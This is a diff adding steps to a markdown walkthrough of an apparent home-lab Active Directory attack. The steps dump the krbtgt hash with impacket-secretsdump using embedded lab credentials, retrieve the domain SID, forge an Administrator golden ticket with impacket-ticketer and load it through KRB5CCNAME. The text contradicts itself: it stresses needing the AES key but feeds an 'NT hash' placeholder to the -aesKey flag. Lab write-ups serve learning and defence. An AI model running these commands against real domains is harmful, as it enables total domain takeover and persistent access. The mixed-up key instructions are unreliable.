@@ -144,3 +144,29 @@ xfreerdp /v:10.10.10.10 /d:homelab.local /u:alisha /p:"welcome1" /cert:ignore /d
 ```
 impacket-secretsdump homelab.local/administrator:AdminPassword@10.10.10.10
 ```
+- We were successfully able to dump the `krbtgt`'s hash as highlighted in blue. We specifically need the AES key
+
+<p align="center">
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/b7438446-7a82-47e2-9840-cfb412ec2698" />
+</p>
+
+- I also needed the domain SID and I ran Powershell on the DC to get it. We need this because a forged ticket has to claim membership in a specific domain
+
+<p align="center">
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/a7505858-09fa-4964-91cf-477019b7e606" />
+</p>
+
+- An example is `S-1-5-21-1234567890-1234567890-1234567890` but there is another number attached after the third `1234567890` in the above SID which we can drop because that states the account's individual RID which is part of the domain SID itself. We can now forge the ticket
+
+```
+impacket-ticketer -aesKey  <krbtgt-NT-hash> -domain-sid <domain-SID> -domain homelab.local -user-id 500 fakeadmin
+```
+- The ticket is forged and this creates a file called `fakeadmin.ccache`. Above, we knew the `nthash` from dumping which signs the fake ticket so the KDC accepts it as a legitimate ticket, `-user-id 500` tells us that the RID is 500 which is always the built in Administrator so this ticket has Administrator level rights and `fakeadmin` is a username which can be anything, even a real local domain user or the Administrator
+<p align="center">
+<img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/11ff8390-968c-4219-acae-a52896745dc0" />
+</p>
+
+- We can load the forged ticket into our session where this tells Kereberos aware tools to use this ticket file for authentication instead of asking for a password
+```
+export KRB5CCNAME=fakeadmin.ccache
+```
